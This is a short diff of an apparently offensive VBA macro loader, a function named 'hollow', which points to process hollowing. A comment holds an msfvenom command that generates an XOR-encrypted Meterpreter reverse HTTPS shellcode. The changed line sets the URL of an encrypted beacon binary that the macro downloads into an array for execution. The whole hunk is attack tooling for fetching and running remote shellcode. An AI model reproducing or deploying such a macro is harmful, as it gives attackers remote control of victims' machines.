@@ -180,7 +180,7 @@ Function hollow()
 
     ' msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key 'CHANGEMYKEY'
     ' URL of the beacon file
-    url = "http://192.168.45.175:8000/beacons/agent.x86.enc.bin"
+    url = "http://192.168.45.1:80/beacons/agent.x86.enc.bin"
     
     ' Download and get array
     sc = DownloadBinFileToArray(url)
